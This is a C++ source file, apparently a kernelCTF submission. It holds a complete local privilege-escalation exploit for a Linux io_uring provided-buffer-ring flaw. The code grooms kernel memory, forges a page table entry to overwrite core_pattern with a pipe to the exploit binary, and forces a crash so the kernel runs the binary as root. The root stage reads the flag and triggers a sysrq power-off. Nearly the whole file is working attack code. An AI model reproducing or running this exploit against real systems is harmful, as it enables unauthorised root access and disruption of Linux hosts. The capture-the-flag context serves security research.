#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <sched.h>
#include <pthread.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <err.h>
#include <sys/auxv.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/bpf.h>
#include <sys/sendfile.h>
#include <linux/kcmp.h>
#include <assert.h>
#include "io_uring.h"
#include <xdk/core.h>

INCBIN(target_db, "target_db.kxdb");

/* * ---------------------------------------------------------------------------
 * Constants & Macros
 * ---------------------------------------------------------------------------
 */

// Target specific addresses (fetched dynamically via kernelXDK)
// ADDR_CORE_PATTERN and ADDR_EMPTY_ZERO_PAGE are passed as arguments now

// PTE Flags: Present, RW, User, Dirty, Accessed, etc.
#define PTE_FLAGS_MASK         0x367 

// Configuration
#define SPRAY_COUNT            0x2000
#define SPRAY_BASE_ADDR        0x40000000
#define RING_FD_COUNT          0x100
#define PAGE_SIZE              0x1000
#define URING_ENTRIES          0x8000
#define ALIGNMENT_MASK         0x1fff
#define EXPECTED_MAGIC         0x25

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

/* * ---------------------------------------------------------------------------
 * Globals
 * ---------------------------------------------------------------------------
 */

// Global storage for sprayed addresses to be modified by the vulnerability
size_t *spray_addrs[SPRAY_COUNT];

/* * ---------------------------------------------------------------------------
 * Utility Functions (util_)
 * ---------------------------------------------------------------------------
 */

void util_pin_cpu(int cpu_id)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu_id, &mask);
    SYSCHK(sched_setaffinity(0, sizeof(mask), &mask));
}

void util_hexdump(const void *data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i)
    {
        printf("%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
        {
            ascii[i % 16] = ((unsigned char *)data)[i];
        }
        else
        {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size)
        {
            printf(" ");
            if ((i + 1) % 16 == 0)
            {
                printf("|  %s \n", ascii);
            }
            else if (i + 1 == size)
            {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8)
                {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

/* * ---------------------------------------------------------------------------
 * Environment Setup (setup_)
 * ---------------------------------------------------------------------------
 */

void setup_resources()
{
    setvbuf(stdout, 0, 2, 0);
    struct rlimit rlim = {
        .rlim_cur = 0x1000,
        .rlim_max = 0x1000};
    SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));
    util_pin_cpu(0);
}

// Prepare io_uring instances to groom memory
void setup_uring_spray_fds(int *fds, int count)
{
    for (int i = 0; i < count; i++)
    {
        struct io_uring_params params = {};
        fds[i] = SYSCHK(syscall(SYS_io_uring_setup, 1, &params));
    }
}

/* * ---------------------------------------------------------------------------
 * Vulnerability Trigger (vuln_)
 * ---------------------------------------------------------------------------
 */

// Triggers the io_uring vulnerability to modify the page tables of our sprayed area
// @step(name="Triggering the Vulnerability")
// Vulnerability trigger: Page Table Entry manipulation
void vuln_trigger_overwrite(uint64_t offset_core_pattern, uint64_t offset_empty_zero_page)
{
    int fds[RING_FD_COUNT];
    int uring_fd;
    int comm_socks[2];
    
    // @step(name="Prepare Spray FDs")
    setup_uring_spray_fds(fds, RING_FD_COUNT);

    // @step(name="Register PBUF Ring")
    struct io_uring_buf_reg reg_ring_init = {
        .ring_addr = 0,
        .ring_entries = 0x1,
        .bgid = 1,
        .flags = IOU_PBUF_RING_MMAP};
    SYSCHK(syscall(__NR_io_uring_register, fds[0], IORING_REGISTER_PBUF_RING, &reg_ring_init, 1));
    
    // Create the shared buffer for the ring
    char *io_addr = (char *)SYSCHK(mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fds[0], IORING_OFF_PBUF_RING + (1 << 16)));
    memset(io_addr, 'a', 0x100);
    
    // Map the target area that will overlap
    SYSCHK(mmap(io_addr - 0x3000, 0x3000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));

    struct iovec iov0 = {.iov_base = (void *)(io_addr - 0x3000), .iov_len = 0x4000};

    // Register buffers across all sprayed FDs to massage kernel heap/state
    for (int i = 0; i < RING_FD_COUNT; i++)
    {
        SYSCHK(syscall(__NR_io_uring_register, fds[i], IORING_REGISTER_BUFFERS, &iov0, 1));
    }

    // @step(name="Setup Main Exploitation Ring")
    struct io_uring_params params = {}; 
    uring_fd = SYSCHK(syscall(SYS_io_uring_setup, URING_ENTRIES, &params));
    
    unsigned char *sq_ring = (unsigned char *)SYSCHK(mmap(NULL, params.sq_off.array + params.sq_entries * sizeof(unsigned), PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
    struct io_uring_sqe *sqes = (struct io_uring_sqe *)SYSCHK(mmap(NULL, params.sq_entries * sizeof(struct io_uring_sqe), PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));

    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, comm_socks));

    struct io_uring_buf_reg reg_ring_exploit = {
        .ring_addr = 0,
        .ring_entries = 0x200,
        .bgid = 1,
        .flags = IOU_PBUF_RING_MMAP};
    SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_PBUF_RING, &reg_ring_exploit, 1));
    
    // Map multiple pages to manipulate alignment
    char *addr_map_1 = (char *)SYSCHK(mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING + (1 << 16)));
    char *addr_map_2 = (char *)SYSCHK(mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING + (1 << 16)));
    char *addr_map_3 = (char *)SYSCHK(mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING + (1 << 16)));
    
    printf("[*] Mapped addresses: %p %p %p\n", addr_map_1, addr_map_2, addr_map_3);

    // Verify alignment requirement
    if (((size_t)addr_map_3 & ALIGNMENT_MASK) == 0) {
        errx(1, "[-] Alignment check failed, exiting to retry.");
    }

    struct iovec iov = {.iov_base = addr_map_3, .iov_len = 0x6000};

    // Unregister previous buffers
    for (int i = 0; i < RING_FD_COUNT; i++)
        SYSCHK(syscall(__NR_io_uring_register, fds[i], IORING_UNREGISTER_BUFFERS, NULL, 0));
        
    SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_BUFFERS, &iov, 1));
    SYSCHK(munmap(io_addr, PAGE_SIZE));

    // @step(name="Spray Target Pages")
    for (int i = 0; i < SPRAY_COUNT; i++)
        spray_addrs[i] = (size_t *)mmap((void *)(0x200000UL * i + SPRAY_BASE_ADDR), PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);

    // Cleanup FDs
    for (int i = 0; i < RING_FD_COUNT; i++)
        close(fds[i]);

    // Checksum verification (to ensure pages are populated)
    size_t sum = 0;
    for (int i = 0; i < SPRAY_COUNT; i++)
        sum += spray_addrs[i][0];
    printf("[*] PageTable allocated %ld\n", sum);

    // @step(name="Trigger Page Write/Read via IO_URING")
    sqes[0] = (struct io_uring_sqe){
        .opcode = IORING_OP_WRITE_FIXED,
        .fd = comm_socks[1],
        .addr = (size_t)addr_map_1 + PAGE_SIZE,
        .len = PAGE_SIZE,
    };
    sqes[1] = (struct io_uring_sqe){
        .opcode = IORING_OP_READ_FIXED,
        .fd = comm_socks[1],
        .addr = (size_t)addr_map_1 + PAGE_SIZE,
        .len = PAGE_SIZE,
    };

    ((int *)(sq_ring + params.sq_off.array))[1] = 1;
    (*(int *)(sq_ring + params.sq_off.tail)) += 2;

    SYSCHK(syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0));
    
    char local_buf[PAGE_SIZE];
    read(comm_socks[0], local_buf, PAGE_SIZE);
    
    #ifdef DEBUG
    util_hexdump(local_buf, 0x10);
    #endif

    // Verify if we got the expected magic byte
    if (local_buf[0] != EXPECTED_MAGIC) {
        errx(1, "[-] Magic byte mismatch (got %02x, expected 0x25)", (unsigned char)local_buf[0]);
    }

    // @step(name="Calculate and Write Fake PTE")
    size_t *pte_view = (size_t *)local_buf;
    // Clear lower 12 bits (offset within page)
    pte_view[0] = pte_view[0] & (~0xfff);
    // Add custom flags
    pte_view[0] = pte_view[0] | PTE_FLAGS_MASK;
    // Adjust logic to point to core_pattern
    pte_view[0] -= (offset_empty_zero_page - (offset_core_pattern & (~0xfff)));
    
    write(comm_socks[0], local_buf, PAGE_SIZE);
    SYSCHK(syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0));
}

/* * ---------------------------------------------------------------------------
 * Payload & Root Acquisition
 * ---------------------------------------------------------------------------
 */

// Reads /proc/sys/kernel/core_pattern to verify overwrite
int util_check_core_pattern()
{
    char buf[0x100] = {};
    int core_fd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    if (core_fd < 0) return 0;
    read(core_fd, buf, sizeof(buf));
    close(core_fd);
    return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

// Drops the payload and triggers a crash
void rip_trigger_crash(const char *cmd)
{
    int memfd = memfd_create("payload", 0);
    // Copy our binary to memfd 
    SYSCHK(sendfile(memfd, open("/proc/self/exe", O_RDONLY), 0, 0xffffffff));
    
    // Position binary at fd 666 (referenced by our core_pattern)
    dup2(memfd, 666);
    close(memfd);

    printf("[*] Waiting for core_pattern overwrite...\n");
    while (util_check_core_pattern() == 0) {
        // @sleep(kernel_func="none", desc="Wait for core_pattern to update")
        sleep(1);
    }
        
    puts("[+] Core pattern overwritten! Triggering crash for Root shell...");
    
    /* Trigger NULL pointer dereference to invoke core_pattern handler */
    *(size_t *)0 = 0;
}

// The function executed as root by the kernel core dump handler
void util_run_as_root()
{
    // Retrieve flag
    system("cat /flag");
    // Ensure flush
    system("sync"); 
    // Trigger sysrq to allow clean exit/log capture if needed
    system("echo o > /proc/sysrq-trigger"); 
}

/* * ---------------------------------------------------------------------------
 * Main
 * ---------------------------------------------------------------------------
 */

int main(int argc, char **argv)
{
    TargetDb kxdb("target_db.kxdb", target_db);
    Target st("kernelctf", "mitigation-v4-6.12");
    // Add missing symbols for this specific kernel build
    st.AddSymbol("core_pattern", 0xffffffff8421b460);
    st.AddSymbol("empty_zero_page", 0xffffffff850f1000);
    kxdb.AddTarget(st);

    auto target = kxdb.AutoDetectTarget();
    printf("[+] Running on target: %s %s\n", target.GetDistro().c_str(), target.GetReleaseName().c_str());

    auto offset_core_pattern = target.GetSymbolOffset("core_pattern");
    auto offset_empty_zero_page = target.GetSymbolOffset("empty_zero_page");

    // Mode 1: The root handler (invoked by kernel via core_pattern)
    if (argc > 1)
    {
        // Parse PID from core_pattern arguments if needed, but we used %P
        // Here we just attach to the dying process to steal FDs/Context if required
        // or simply execute the payload.
        
        if (strcmp(argv[1], "c") == 0) {
            goto child_exploit;

        } else {
             int pid = strtoull(argv[1], 0, 10);
             // Grab stdio from the dying process to see output
             int pfd = syscall(SYS_pidfd_open, pid, 0);
             int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
             int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
             int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
             dup2(stdinfd, 0);
             dup2(stdoutfd, 1);
             dup2(stderrfd, 2);
             
             util_run_as_root();
        }
        return 0;
    }

    // Mode 2: The Initial Exploit Runner
    // Fork a child to actually trigger the crash later, ensuring we have a clean process
    if (fork() == 0)
    {
        util_pin_cpu(1);
        setsid();
        rip_trigger_crash("");
        exit(0);
    }

parent_fork:
    while(1){
        if(fork()==0)
            execlp("/proc/self/exe","exe","c",NULL);
        wait(NULL);
    }
child_exploit:

    setup_resources();
    
    // @step(name="Trigger Vulnerability")
    vuln_trigger_overwrite(offset_core_pattern, offset_empty_zero_page);

    // @step(name="Spray core_pattern payload")
    // Write the pipe command into the memory areas we remapped/sprayed
    // This string |/proc/%P/fd/666 tells kernel to pipe core dump to fd 666 of the crashing process
    for (int i = 0; i < SPRAY_COUNT; i++)
        strcpy((char *)(&spray_addrs[i][(offset_core_pattern & 0xfff) / 8]), "|/proc/%P/fd/666 %P");

    printf("[*] Spray complete. Waiting for crash trigger...\n");
    while(1) {
        // @sleep(kernel_func="none", desc="Keep process alive to maintain memory mappings")
        sleep(1);
    }

    return 0;
}


